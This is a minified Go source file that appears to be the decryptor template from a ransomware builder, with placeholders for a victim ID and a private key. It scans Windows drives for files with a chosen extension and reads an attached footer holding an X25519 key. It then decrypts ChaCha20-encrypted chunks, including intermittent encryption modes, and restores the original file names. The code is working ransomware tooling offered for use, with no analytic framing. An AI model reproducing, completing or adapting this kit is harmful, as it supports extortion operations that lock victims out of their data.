package main
import("crypto/ecdh";"crypto/hmac";"crypto/sha256";"encoding/binary";"fmt";"io";"os";"path/filepath";"runtime";"strings";"sync";"sync/atomic";"syscall";"time";"unsafe";"golang.org/x/crypto/chacha20";"golang.org/x/crypto/hkdf";"golang.org/x/sys/windows")
const mI="{{.ID}}"
const(fM=0x4C494E47;fS=96;cS=1<<20)
const(PF=0;I1=1;I2=2)
const(dR=2;dF=3;dT=4;dK=6)
var mPK=[]byte{{.PrivateKeyBytes}}
type S struct{f,d,s,e,t int64}
func(s*S)ae(){atomic.AddInt64(&s.e,1)}
func(s*S)as(){atomic.AddInt64(&s.s,1)}
func(s*S)af(){atomic.AddInt64(&s.d,1)}
func(s*S)ai(z int64){atomic.AddInt64(&s.f,1);atomic.AddInt64(&s.t,z)}
func ia(d uintptr)bool{return d==dR||d==dF||d==dT||d==dK}
func dd()[]string{k:=syscall.NewLazyDLL("kernel32.dll");l:=k.NewProc("GetLogicalDrives");t:=k.NewProc("GetDriveTypeW");r,_,_:=l.Call();b:=uint32(r);var d []string;for i:=0;i<26;i++{if b&(1<<uint(i))==0{continue};v:=fmt.Sprintf("%c:\\",rune('A'+i));p,_:=syscall.UTF16PtrFromString(v);x,_,_:=t.Call(uintptr(unsafe.Pointer(p)));if ia(x){d=append(d,v)}};return d}
func is(p string)bool{fi,e:=os.Lstat(p);return e==nil&&fi.Mode()&os.ModeSymlink!=0}
func rr(p string){t,e:=syscall.UTF16PtrFromString(p);if e!=nil{return};a,e:=syscall.GetFileAttributes(t);if e==nil&&a&syscall.FILE_ATTRIBUTE_READONLY!=0{syscall.SetFileAttributes(t,a&^syscall.FILE_ATTRIBUTE_READONLY)}}
func ow(p string)(*os.File,error){t,e:=syscall.UTF16PtrFromString(p);if e!=nil{return nil,e};h,e:=syscall.CreateFile(t,syscall.GENERIC_READ|syscall.GENERIC_WRITE,syscall.FILE_SHARE_READ|syscall.FILE_SHARE_WRITE,nil,syscall.OPEN_EXISTING,syscall.FILE_ATTRIBUTE_NORMAL,0);if e!=nil{return nil,e};return os.NewFile(uintptr(h),p),nil}
func cm(n string)bool{t,e:=syscall.UTF16PtrFromString(n);if e!=nil{return false};_,e=windows.CreateMutex(nil,false,t);return e==nil}
func zm(d []byte){for i:=range d{d[i]=0};runtime.KeepAlive(d)}
func dk(m [32]byte,s []byte)[32]byte{r:=hkdf.New(sha256.New,m[:],s,[]byte("filekey"));var k [32]byte;io.ReadFull(r,k[:]);return k}
func co(p int,o int64)[]int64{if p==PF{n:=(o+cS-1)/cS;x:=make([]int64,n);for i:=int64(0);i<n;i++{x[i]=i*cS};return x};s:=int64(5*1024*1024);if p==I2{s=50*1024*1024};var x []int64;x=append(x,0);for q:=s;q+cS<=o;q+=s{x=append(x,q)};l:=o-cS;if l>0&&(len(x)==0||l>=x[len(x)-1]+int64(cS)){x=append(x,l)};if len(x)==0{n:=(o+cS-1)/cS;x=make([]int64,n);for i:=int64(0);i<n;i++{x[i]=i*cS}};return x}
type FF struct{o int64;p int;e,s,h []byte}
func rf(f*os.File,z int64)*FF{if z<fS{return nil};o:=z-fS;b:=make([]byte,fS);if _,e:=f.ReadAt(b,o);e!=nil||binary.LittleEndian.Uint32(b[0:4])!=fM||int64(binary.LittleEndian.Uint64(b[4:12]))!=o{return nil};return&FF{o:o,p:int(b[12]),e:b[16:48],s:b[48:64],h:b[64:96]}}
func vh(f*os.File,x []int64,o int64,k [32]byte,s,m,b []byte)bool{h:=hmac.New(sha256.New,k[:]);h.Write(s);for _,v:=range x{r:=cS;if v+int64(r)>o{r=int(o-v)};f.Seek(v,io.SeekStart);if n,_:=f.Read(b[:r]);n!=r{return false};h.Write(b[:r])};return hmac.Equal(h.Sum(nil),m)}
func dc(f*os.File,x []int64,o int64,k [32]byte,b,n []byte)bool{for _,v:=range x{r:=cS;if v+int64(r)>o{r=int(o-v)};f.Seek(v,io.SeekStart);if i,_:=f.Read(b[:r]);i!=r{return false};for j:=range n{n[j]=0};binary.LittleEndian.PutUint64(n[16:],uint64(v));c,e:=chacha20.NewUnauthenticatedCipher(k[:],n);if e!=nil{return false};c.XORKeyStream(b[:r],b[:r]);f.Seek(v,io.SeekStart);if _,e:=f.Write(b[:r]);e!=nil{return false}};return true}
func df(p string,s*S,m*ecdh.PrivateKey,b,n []byte){rr(p);f,e:=ow(p);if e!=nil{s.ae();return};defer f.Close();i,e:=f.Stat();if e!=nil{s.ae();return};ft:=rf(f,i.Size());if ft==nil{s.as();return};ep,e:=ecdh.X25519().NewPublicKey(ft.e);if e!=nil{s.ae();return};sh,e:=m.ECDH(ep);if e!=nil{s.ae();return};defer zm(sh);mk:=sha256.Sum256(sh);fk:=dk(mk,ft.s);ox:=co(ft.p,ft.o);if !vh(f,ox,ft.o,fk,ft.s,ft.h,b)||!dc(f,ox,ft.o,fk,b,n){s.ae();return};f.Sync();f.Truncate(ft.o);f.Close();x:=filepath.Ext(p);if x!=""{v:=strings.TrimSuffix(p,x);os.Rename(p,v)};s.ai(ft.o)}
func sp(d []string,c chan<- string,w,p*sync.WaitGroup){defer w.Done();for _,v:=range d{p.Add(1);c<-v}}
func dw(s*S,f chan<- string,d chan string,m chan struct{},w,dp,fp*sync.WaitGroup,t string){defer w.Done();for v:=range d{m<-struct{}{};func(p string){defer dp.Done();defer func(){<-m}();if is(p){s.as();return};e,r:=os.ReadDir(p);if r!=nil{s.ae();return};for _,o:=range e{n:=o.Name();u:=filepath.Join(p,n);if o.IsDir(){l:=strings.ToLower(n);if l=="$recycle.bin"||l=="system volume information"||(len(n)>0&&n[0]=='$'){s.as();continue};s.af();dp.Add(1);go func(z string){d<-z}(u)}else{if !strings.HasSuffix(n,"."+t){s.as();continue};fp.Add(1);go func(z string){defer fp.Done();f<-z}(u)}}}(v)}}
func fs(b int64)string{const(K=1024;M=K*K;G=K*M;T=K*G);switch{case b>=T:return fmt.Sprintf("%.2f TB",float64(b)/float64(T));case b>=G:return fmt.Sprintf("%.2f GB",float64(b)/float64(G));case b>=M:return fmt.Sprintf("%.2f MB",float64(b)/float64(M));case b>=K:return fmt.Sprintf("%.2f KB",float64(b)/float64(K));default:return fmt.Sprintf("%d B",b)}}
func fn(n int64)string{s:=fmt.Sprintf("%d",n);if len(s)<=3{return s};var r []byte;for i,c:=range s{if i>0&&(len(s)-i)%3==0{r=append(r,'.')};r=append(r,byte(c))};return string(r)}
func main(){if len(os.Args)<2{os.Exit(1)};t:=os.Args[1];if !cm("Global\\Decryptor_"+mI){os.Exit(0)};c:=runtime.NumCPU();runtime.GOMAXPROCS(c);w:=c*4;fc:=make(chan string,1000);dc:=make(chan string,1000);fmt.Printf("M:%s\n",t);st:=time.Now();ss:=&S{};m,e:=ecdh.X25519().NewPrivateKey(mPK);if e!=nil{panic(e)};var dwg sync.WaitGroup;for i:=0;i<w;i++{dwg.Add(1);go func(){defer dwg.Done();b:=make([]byte,cS);n:=make([]byte,24);for p:=range fc{df(p,ss,m,b,n)}}()};var pw,rg sync.WaitGroup;var dp,fp sync.WaitGroup;var dr []string;if len(os.Args)>2{dr=[]string{os.Args[2]}}else{dr=dd()};pw.Add(1);go sp(dr,dc,&pw,&dp);go func(){pw.Wait();dp.Wait();close(dc)}();sm:=make(chan struct{},w);for i:=0;i<w;i++{rg.Add(1);go dw(ss,fc,dc,sm,&rg,&dp,&fp,t)};rg.Wait();fp.Wait();close(fc);dwg.Wait();el:=time.Since(st);fmt.Printf("F:%s\nT:%s\n",fn(atomic.LoadInt64(&ss.f)),el)}
